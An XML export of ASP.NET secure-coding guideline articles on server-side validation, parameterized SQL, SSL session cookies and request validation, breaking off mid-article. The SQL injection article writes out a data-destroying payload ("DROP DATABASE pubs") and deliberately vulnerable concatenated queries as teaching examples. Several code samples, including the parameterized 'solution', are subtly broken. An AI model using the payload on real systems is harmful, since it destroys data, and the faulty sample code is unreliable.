      <Title>Do Not Rely on Client-side Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Do not rely on client-side validation for security purposes. Use server-side validation to ensure that data is safe and perform security decisions based on that. Client-side validation&nbsp;should be used solely to&nbsp;reduce round trips to the server and to improve the user experience.&nbsp;&nbsp;&nbsp;&nbsp; </p><h1>Why</h1><p>Client side validation can be easily bypassed. For example, a malicious user could disable&nbsp;the client-side script routines by disabling JavaScript.&nbsp;Users&nbsp;may also construct their own&nbsp;form posts using custom html, or&nbsp;using an&nbsp;HTTP proxy to modify form posts.&nbsp;&nbsp;If developers rely on the controls in the client's user interface and do not validate all results on the back end, it may introduce injection vulnerabilities that would allow an attacker to bypass data input restrictions and gain access to unintended application functionality.</p><h1>When</h1><p>During implementation, ensure all input from&nbsp;the client is&nbsp;validated, even if the input is not stored.</p><h1>How</h1><p>It's important to specify what input is acceptable, rather then trying to specify all&nbsp;the&nbsp;variations&nbsp;of input that are&nbsp;illegal (whitelisting as opposed to blacklisting).&nbsp;Use ASP.NET validator controls to check user input on the server side and provide feedback to the user when input fails to pass validation requirements.&nbsp;Follow these steps on each form page in an application: </p><ol><li><p><strong>Determine the required fields.</strong> Use the required field validator control to ensure all required fields are present. Here is an example that declares a textfield in an ASP page that is a required field:</p><pre>&lt;td&gt;<br>&nbsp;&nbsp; &lt;asp:RequiredFieldValidator runat=server <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate=txtName<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="User ID is required."&gt; *<br>&nbsp;&nbsp; &lt;/asp:RequiredFieldValidator&gt;<br>&lt;/td&gt;<br>&lt;td&gt;User ID:&lt;/td&gt;<br>&lt;td&gt;&lt;input type=text runat=server id=txtName&gt;&lt;/td&gt;</pre><p>The * is displayed next to the label if the input is blank. The error message is reported in a summary. The "ControlToValidate" property specifies the ID of the control to validate. The final step is to add a validation summary to the top of the page like so:</p><pre>&lt;asp:ValidationSummary runat=server <br>HeaderText="There were errors on the page:" /&gt;<br></pre></li><li><p><strong>Enforce numeric range&nbsp;constraints.</strong> Use the RangeValidator control to ensure any numeric values are constrained to a specific, acceptable&nbsp;range. Here is an example that declares an integer field&nbsp;in an ASP page that has&nbsp;a valid range from 1 to 50:</p><pre>&lt;td&gt;</pre><pre>  &lt;asp:RangeValidator id="Range1"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="txtState"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MinimumValue="1"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MaximumValue="50"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Type="Integer"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EnableClientScript="false"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="The value must be from 1 to 10!"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; runat="server"&gt; * </pre><pre>&nbsp; &lt;/asp:RangeValidator&gt;<br>&lt;/td&gt;<br>&lt;td&gt;State:&lt;/td&gt;<br>&lt;td&gt;&lt;input type=text runat=server id=txtState&gt;&lt;/td&gt;</pre></li><li><p><strong>Validate&nbsp;verification fields.</strong> Fields such as password entry are often verified by having the user re-type them to ensure they are correct. Use the CompareValidator control to make the comparisons and ensure validity/integrity. Here is an example that declares&nbsp;two password&nbsp;fields&nbsp;in an ASP page that&nbsp;must match in order to validate properly:</p><pre>&lt;asp:CompareValidator runat=server<br>            ControlToValidate=txtRePWord<br>            ControlToCompare=txtPWord<br>             ErrorMessage="Passwords do not match." /&gt;</pre><p>In this case, the two fields being compared are "txtPWord" and "txtRePWord". If they do not&nbsp;match, validation fails with the error message, "Passwords do not match.".&nbsp;</p></li><li><p><strong>Enforce type constraints on string fields.</strong> String fields are the most difficult type of input to effectively validate because the range of acceptable&nbsp;characters is much larger then numeric&nbsp;and enumerated types. Regular expression provide a flexible mechanism for dictating valid patterns and characters. Use the RegularExpressionValidator to perform a variety of checks on string-based fields such as zip codes and phone numbers.&nbsp; Here is an example that declares an&nbsp;text field&nbsp;in an ASP page that should represent a five digit zip code, consisting entirely of numberic digits, and a validator to enforce those constraints:</p><pre>&lt;input type=text runat=server id=txtZip&gt;<br>      &lt;asp:RegularExpressionValidator runat=server<br>             ControlToValidate="txtZip"<br>             ErrorMessage="Zip code must be 5 digits, all numbers."<br>             ValidationExpression="[0-9]{5}"&gt; * </pre><pre>      &lt;/asp:RegularExpressionValidator&gt;</pre><pre>&lt;td&gt;Zip code:&lt;/td&gt;<br>&lt;td&gt;&lt;input type=text runat=server id=txtZip&gt;&lt;/td&gt;</pre></li><li><p><strong>Use custom validation to handle remaining&nbsp;input constraints.</strong> The built-in ASP.NET&nbsp;validation controls handle&nbsp;most of the cases that commonly arise in&nbsp;web applications, but there&nbsp;may be&nbsp;times when they are not appropriate.&nbsp;The CustomValidator enables custom validation code that can plugs into the existing validation system.&nbsp;Here is an example that declares a&nbsp;text field&nbsp;in an ASP page. For this particular text field, there is business logic that needs to be satisfied which is not easily constrainable by the&nbsp;other&nbsp;validation constructs, so a&nbsp;custom validator is implementated that ensures the&nbsp;string&nbsp;in the text field&nbsp;does not start&nbsp;with the letter "a":</p><pre>&lt;%@ Page Language="vb" %&gt;<br>&lt;script runat=server&gt;</pre><pre>public sub CheckID(source as Object, args as ServerValidateEventArgs)<br>&nbsp;&nbsp;&nbsp; args.IsValid = args.Value.substring(0, 1).tolower() &lt;&gt; "a"<br>end sub </pre><pre>&lt;/script&gt;</pre><p>To call this function, add a CustomValidator, which is designed to call developer code to perform its check. Here is the declaration:</p><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:CustomValidator runat=server<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; controltovalidate="txtName" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; errormessage="ID is already in use." <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnServerValidate="CheckID" /&gt;</pre><p>It is worth noting that this could have been done with the RegularExpression validation control, but in this case it makes more sense to use custom validation since&nbsp;a type of high-level validation that could conceivably be more complex then a simple pattern match is being defined (e.g., the validation rules might change based on application state).&nbsp;</p></li><li><p><strong>Use the Regex class to validate other sources</strong></p><p>Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies. Validate input from all of these sources to help prevent injection attacks. Use regular expressions to help validate input. The following example shows how to use the <strong>Regex</strong> class. </p><pre>using System.Text.RegularExpressions ;<br> // Instance method:Regex reg = new Regex(@"^[a-zA-Z'.\s]{1,40}$");<br>Response.Write(reg.IsMatch(Request.QueryString["Name"]));<br>// Static method:<br>if (!Regex.IsMatch(Request.QueryString["Name"],@"^[a-zA-Z'.\s]{1,40}$"))<br> {<br>   // Name does not match expression<br> }</pre><p>If you cannot cache your regular expression for frequent use, you should use the static <strong>IsMatch</strong> method where possible for performance reasons, to avoid unnecessary object creation.</p></li></ol><h1>Problem Example</h1><p>Consider a very simple form for an online shopping cart. The cart component consists of two components:</p><ol><li><p>An HTML form that contains all of the fields that make up the order to be submitted for processing:</p><pre>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;Widget shopping cart&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>&nbsp;&nbsp;  &lt;H1&gt;welcome to the most boring shopping cart on the web!&lt;/H1&gt; </pre><pre>    A widget's current price is $19.95 USD. Please use the following form to submit an order.</pre><pre>    &lt;form action="process_order.aspx" method="POST"&gt;  <br>      &lt;p&gt;Please enter the number of widgets you would like to purchase:&lt;/p&gt;<br>&nbsp;&nbsp;&nbsp;   quantity:&lt;br/&gt;<br>&nbsp;&nbsp;&nbsp;  &nbsp;&lt;select name="WidgetQuantity"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;  &nbsp; &lt;option value="1"&gt;1&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   &lt;option value="2"&gt;2&lt;/option&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   &lt;option value="3"&gt;3&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   &lt;option value="4"&gt;4&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;  &lt;/select&gt;</pre><pre>      ...<br>      &lt;input type="submit" value="order"/&gt;<br>    &lt;/form&gt;</pre><pre>  &lt;/body&gt;<br>&lt;/html&gt;</pre></li><li><p>An ASP.NET page that processes the form submissions and performs the necessary steps to create the order.</p><pre>int&nbsp;dQuantity = Request("WidgetQuantity");<br>double dPrice = 19.95;</pre><pre>double dCost = dQuantity * dPrice;</pre><p>This server side page is problematic because it lacks validation to ensure the quantity field is correct.&nbsp;The application&nbsp;works fine in the case where a user plays by the rules and submits the form as it is shown, because the&nbsp;quantity field ensures that the range constraints for the order quantity are always valid.&nbsp;However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could result in a credit to the user's account. It also&nbsp;might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs&nbsp;later on.</p></li></ol><h1>Solution Example</h1><p>Consider the following ASP.NET page that processes the form submissions and performs the necessary steps to create an order:</p><pre>&lt;%@ Page Language="vb" %&gt;<br>&lt;script runat=server&gt;<br>public sub OnSubmit(source as Object, e as EventArgs)<br>&nbsp;&nbsp;&nbsp; if Page.IsValid then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' Now we can perform our transaction.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int dQuantity = Request("WidgetQuantity");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double dPrice = 19.95;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double dCost = dQuantity * dPrice;<br>&nbsp;&nbsp;&nbsp; end if<br>end sub<br>&lt;/script&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Validation Sample&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;</pre><pre>&lt;form runat=server&gt;<br>&lt;asp:ValidationSummary runat=server headertext="There were errors on the page:" /&gt;</pre><pre>&lt;table&gt;<br>&nbsp; &lt;tr&gt;<br>&nbsp;&nbsp;&nbsp; &lt;td&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:RequiredFieldValidator runat=server <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; controltovalidate="WidgetQuantity"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; errormessage="WidgetQuantity is required."&gt;*<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:RequiredFieldValidator&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br>&nbsp;&nbsp;&nbsp; &lt;td&gt;A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;/td&gt;<br>&nbsp;&nbsp;&nbsp; &lt;td&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;select name="WidgetQuantity"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;option value="1"&gt;1&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;option value="2"&gt;2&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;option value="3"&gt;3&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;option value="4"&gt;4&lt;/option&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/select&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:RegularExpressionValidator runat=server display=dynamic<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; controltovalidate="WidgetQuantity"&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; errormessage="WidgetQuantity must be a non-zero, positive integer." <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validationexpression="[1-9]{1}[0-9]{0,7}" /&gt;</pre><pre>&nbsp;&nbsp;&nbsp; &lt;/td&gt;<br>&nbsp; &lt;/tr&gt;<br>...<br>&lt;/table&gt;&lt;br&gt;<br>&lt;input type=submit runat=server id=cmdSubmit value=Submit onserverclick=OnSubmit&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</pre><p>The ASP.NET Validator control provides client-side validation to reduce roundtrips to the server and improve user experience, but also provides server-side validation to&nbsp;&nbsp;ensure that the widget quantity field is&nbsp;a positive integer. It is also validated as a required field that must be provided before submitting the order.</p><h1>Additional Resources</h1><ul><li><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnaspp/html/pdc_userinput.asp">User Input Validation in ASP.NET&nbsp;</a> </li><li><a href="http://msdn2.microsoft.com/en-us/library/e5a8xz39.aspx">Validation Server Control Syntax </a></li><li><a href="http://en.wikipedia.org/wiki/Code_injection">General Purpose Code Injection article </a></li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:a1fc05ee-63a4-4568-b273-6ad485494a05"></a><a href="ruledisplay:4cfb84e3-b640-44c1-8950-cc38262ce118">Application Does Not Rely Only on Request Validation</a> </li><li><a href="ruledisplay:3f4ffd45-82e9-4bb3-8792-5d2ccc664dbe">Free Form Input is Sanitized to Protect Against Malicious Data</a> </li><li><a href="ruledisplay:417133af-0ab8-4ad5-9aea-a59b08abf022">All the Input is Validated For Length, Range, Format, and Type</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1011629712" Content_Hash="1149515648">
    <Metadata>
      <Id>2c70968c-33b3-46a2-a157-c3022f3d7bd8</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Avoid Dynamic Queries that Accept User Input</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Avoid constructing SQL queries in code that include user input; instead, prefer parameterized stored procedures that use type safe SQL parameters.&nbsp;If stored procedures&nbsp;cannot be used, use parameterized dynamic SQL statements.</p><h1>Why</h1><p>Database queries constructed dynamically&nbsp;from user input&nbsp;are susceptible to SQL injection. A successful SQL injection attack enables a malicious user to execute commands&nbsp;on the&nbsp;application's database instance by using the privileges granted to&nbsp;the application's login. Using stored procedures with parameterized SQL is recommended because SQL parameters are type safe&nbsp;and treated as&nbsp;literal values by the database,&nbsp;not as executable code. Parameters are also checked for type and length. </p><h1>When</h1><p>Always use parameterized SQL queries. Avoid constructing SQL queries directly from&nbsp;any input, including form fields, query string parameters, and cookies.&nbsp;&nbsp;</p><h1>How</h1><p>To protect&nbsp;an application from SQL injection, perform the following steps:</p><ol><li><p><strong>Use parameters with stored procedures.</strong> Stored procedures alone&nbsp;will not prevent SQL injection.&nbsp;Lack&nbsp;of&nbsp;parameter usage means that&nbsp;stored procedures will be susceptible to SQL injection, especially if they use unfiltered input. The following code shows how to use SqlParameterCollection when calling a stored procedure:</p><pre>using System.Data;<br>using System.Data.SqlClient;</pre><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myCommand = new SqlDataAdapter( <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "LoginStoredProcedure", connection);<br>&nbsp; myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;<br>&nbsp; myCommand.SelectCommand.Parameters.Add("@au_id", SqlDbType.VarChar, 11);<br>&nbsp; myCommand.SelectCommand.Parameters["@au_id"].Value = AuthId.Text;</pre><pre>&nbsp; myCommand.Fill(userDataset);<br>}</pre><p>In this case, the @au_id parameter is treated as a literal value and not as executable code. Also, the parameter is checked for type and length. In the preceding code example, the input value cannot be longer than 11 characters. If the data does not conform to the type or length defined by the parameter, the SqlParameter class throws an exception.</p></li><li><p><strong>Use parameters with dynamic SQL.</strong> If stored procedures are unavailable, use parameters when constructing dynamic SQL statements. The following code shows how to use SqlParametersCollection with dynamic SQL:</p><pre>using System.Data;<br>using System.Data.SqlClient;</pre><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connection);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; myCommand.SelectCommand.Parameters.Add("@au_id", SqlDbType.VarChar, 11);<br>&nbsp; myCommand.SelectCommand.Parameters["@au_id"].Value = AuthId.Text;<br>&nbsp; myDataAdapter.Fill(userDataset);<br>}</pre></li></ol><h1>Problem Example</h1><p>An ASP.NET book purchasing application has a query interface that allows book titles and authors to be de retrieved by submitting an ISBN. The appllication developer's writes a SQL query&nbsp;to accomplish this task:</p><pre>string SQLstr = "SELECT book_name, author_name FROM book WHERE book_ISBN = '" + ISBN.Text + "'";</pre><p>The&nbsp;ISBN input is from a textfield in the&nbsp;web&nbsp;form which is used to directly generate&nbsp;the SQL statement. For example:</p><pre>SELECT book_name, author_name FROM book WHERE book_ISBN = '0321194330'</pre><p>Consider what happens when a user types the following string in the&nbsp;ISBN text box, which is expecting an ISBN in the form nnnnnnnnnn:</p><pre>' ; DROP DATABASE pubs&nbsp; --<br>&nbsp; </pre><p>The code inserts the user's malicious input and generates the following query.</p><pre>SELECT book_name, author_name FROM book WHERE book_ISBN = ''; DROP DATABASE pubs --'&nbsp; </pre><p>In this case, the ' (single quotation mark) character that starts the rogue input terminates the current string literal in the SQL statement. The ; (semicolon) character tells SQL that this is the end of the current statement, which is then followed by the following malicious SQL code. Finally, the -- (double dash) sequence of characters is a SQL comment that tells SQL to ignore the rest of the text. In this case, SQL ignores the closing ' (single quotation mark) character, which would otherwise cause a SQL parser error.</p><h1>Solution Example</h1><p>An ASP.NET book purchasing application has a query interface that allows book titles and authors to be de retrieved by submitting an ISBN. The appllication developer's writes a SQL query&nbsp;to accomplish this task:</p><pre>string SQLstr = "book_name, author_name FROM book WHERE book_ISBN = '" + ISBN.Text + "'";</pre><p>The ISBN input is from a textfield in the&nbsp;web&nbsp;form which is used to directly generate&nbsp;the SQL statement. For example:</p><pre>SELECTbook_name, author_name FROM book WHERE book_ISBN = '0321194330'</pre><p>The&nbsp;SQL&nbsp;statement can be made safer by re-writing it as a parameterized, stored procedure:</p><pre>using System.Data;<br>using System.Data.SqlClient;</pre><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "'0321194330'= @isbn",&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connection);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; myCommand.SelectCommand.Parameters.Add("@isbn", SqlDbType.VarChar, 11);<br>&nbsp; myCommand.SelectCommand.Parameters["@isbn"].Value = ISBN.Text;<br>&nbsp; myDataAdapter.Fill(userDataset);<br>}</pre><p>The SQL query statement&nbsp;is constructed similarly to&nbsp;the&nbsp;first SQL statement, except that the&nbsp;ISBN column selection criteria is represented as a placeholder rather than directly concatenated into the SQL query. The next two lines specify the variable type, the expected length, and the&nbsp;value of the&nbsp;ISBN field used in this particular query.&nbsp; This protects against SQL injection attacks because @isbn is specified as a VarChar, which means it can't possibly be an executable SQL statement.&nbsp;Consequently, it will&nbsp;be interpreted by the database driver as a&nbsp;String literal.&nbsp;&nbsp;</p><p>It is important to note that while parameterized, stored procedures will help reduce the risk of SQL injection, there are other script injection vulnerabilities that will be possible. For more information see&nbsp;the related guideline, "Validate Untrusted Input Passed to Data Access Methods". </p><h1>Related Items</h1><ul><li><a href="ruledisplay:fab1733c-61d7-46a8-88c6-2617a643c0d9">Use Least Privileged Accounts for Database Access</a> </li><li><a href="ruledisplay:4be4ed09-ed2f-4f05-9e63-e20708807542">Use Type Safe SQL Parameters when Constructing SQL Queries</a> </li><li><a href="ruledisplay:75fce1f7-10d9-430e-b7ab-ce2b73d9f2bc">Validate Untrusted Input Passed to Data Access Methods</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1665382395" Content_Hash="-1083124832">
    <Metadata>
      <Id>30a0fcea-6b9a-4f9b-b377-ef89fb6ec927</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL to Protect Session Cookies on Authenticated Pages</Title>
      <Category>Session Management</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use SSL to protect session cookies on authenticated pages. </p><h1>Why</h1><p>Failing to protect authentication tickets is a common vulnerability that can lead to unauthorized spoofing and impersonation, session hijacking, and elevation of privilege.</p><h1>When</h1><p>All systems which use cookies for authentication should protect those cookies via SSL on all pages which require authentication, and ensure that the cookies are not used/sent for pages which do not require authentication and do not use SSL. </p><h1>How</h1><p>Set <strong>requireSSL="true"</strong> on the &lt;<strong>forms</strong>&gt; element, as shown in the following code.</p>
<pre>&lt;forms loginUrl="Secure\Login.aspx"<br>       requireSSL="true" ... /&gt;  </pre><br><p>By setting <strong>requireSSL="true"</strong>, you set the <strong>secure</strong> cookie property that determines whether browsers should send the cookie back to the server. With the <strong>secure</strong> property set, the cookie is sent by the browser only to a secure page that is requested using an HTTPS URL. </p><h1>Additional resources</h1><ul><li><div><a href="http://msdn2.microsoft.com/en-us/library/ms998317.aspx">How To: Use Forms Authentication with SQL Server in ASP.NET</a></div></li><li><div><a href="http://msdn2.microsoft.com/en-us/library/ms998288.aspx">How To: Configure the Machine Key in ASP.NET</a></div></li><li><div><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;813829">Info: Help Secure Forms Authentication by Using Secure Sockets Layer (SSL)</a></div></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1663006208" Content_Hash="1772302196">
    <Metadata>
      <Id>320f3578-7231-41d3-be4b-db79957bd496</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Do Not Rely on Request Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Do not rely on the ASP.NET request validation feature to detect all bad input. Use it only as an extra precautionary measure in addition to your own input validation.</p><h1>Why</h1><p>The ASP.NET request validation feature only performs basic input validation and should not be relied upon to detect all types of malicious data. It is not sufficient even for preventing attacks like cross site scripting and SQL injection, and each application has specific validation needs—what is good input to one application may be bad input for another.</p><h1>When</h1><p>When user input is submitted from a webpage back to the server.</p><h1>How</h1><p>Request validation is enabled by default. You can see this by examining the <strong>validateRequest</strong> attribute, which is set to true on the <strong>&lt;pages&gt;</strong> element in the <strong>Machine.config.comments </strong>file. This will automatically try to validate all input submitted to the web application. Ensure that it is enabled for all pages except those that need to accept a range of HTML elements. If you need to disable it for a page, set the <strong>ValidateRequest</strong> attribute to <strong>false</strong> by using the <strong>@Page</strong> directive as follows:</p><pre>&lt;%@ Page Language="C#" ValidateRequest = "false" %&gt;</pre><p>This feature can also be called explicitly by the server by using the <strong>Request.ValidateInput()</strong> call.</p><p>Remember, whether using the page directive to automatically validate or calling <strong>Request.ValidateInput() </strong>explicitly, our aim is to only use this feature as an added precaution. In order to ensure that you are handling user data correctly, ensure that you are following all of these steps: </p><ol><li>Always validate input as strictly as possible against the expected input format via regular expressions. See the guideline <a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Validate Input for Length, Range, Format, and Type</a> to learn how to do this effectively. </li><li>Ensure that all queries are fully parameterized, especially if they use user input. See <a href="ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F">Use Type Safe SQL Parameters When Constructing SQL Queries</a> to learn how to do so. </li><li>Do not make any security decisions based on user input. To learn how to do so, refer to the guideline <a href="ruledisplay:179C1FD4-A8DA-466B-81EF-202DF7561536">Do Not Make Security Decisions Based on Client-Accessible Parameters</a>. </li><li>Do not allow users to input filenames or paths. See the guideline <a href="ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E">Filter All User-Supplied Filename and Path Input</a> to learn how to do so.</li></ol><h1>Problem Example</h1><p>In this example which uses an online shopping cart. The cart component consists of two components:</p><ol><li><p>An HTML form that contains all of the fields that make up the order to be submitted for processing:</p><pre>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;Widget shopping cart&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;H1&gt;welcome to the most boring shopping cart on the web!&lt;/H1&gt;<br>     A widget's current price is $19.95 USD. Please use the following form to submit an order.<br>    &lt;form action="process_order.aspx" method="POST"&gt;<br>       &lt;p&gt;Please enter the number of widgets you would like to purchase:&lt;/p&gt;<br>       quantity:&lt;br/&gt;<br>       &lt;select name="WidgetQuantity"&gt;<br>        &lt;option value="1"&gt;1&lt;/option&gt;<br>        &lt;option value="2"&gt;2&lt;/option&gt;<br>        &lt;option value="3"&gt;3&lt;/option&gt;<br>        &lt;option value="4"&gt;4&lt;/option&gt;<br>      &lt;/select&gt;<br>      ...<br>      &lt;input type="submit" value="order"/&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;</pre></li><li><p>An ASP.NET page that relies on the request validation feature and processes the form submissions and performs the necessary steps to create the order.</p><pre>......<br>try<br>{<br>   Request.ValidateInput();<br>}<br>catch(HttpRequestValidationException e)<br>{<br>   //error out<br>}<br>int dQuantity = Request("WidgetQuantity");<br>double dPrice = 19.95;<br>double dCost = dQuantity * dPrice;<br>......</pre></li></ol><p>This server side page is problematic because it solely relies on the ASP.NET request validation feature. The application works fine in the case where a user plays by the rules and submits the form as it is shown, because the quantity field ensures that the range constraints for the order quantity are always valid. However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could result in a credit to the user's account. It also might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs later on.</p><h1>Solution Example</h1><p>Consider the following ASP.NET page that processes the form submissions and performs the necessary steps to create an order:</p><pre>&lt;%@ Page Language="vb" %&gt;<br>&lt;script runat=server&gt;public sub OnSubmit(source as Object, e as EventArgs)<br>    if Page.IsValid then<br>        ' Now we can perform our transaction.<br>        int dQuantity = Request("WidgetQuantity");<br>        double dPrice = 19.95;<br>        double dCost = dQuantity * dPrice;<br>    end if<br>end 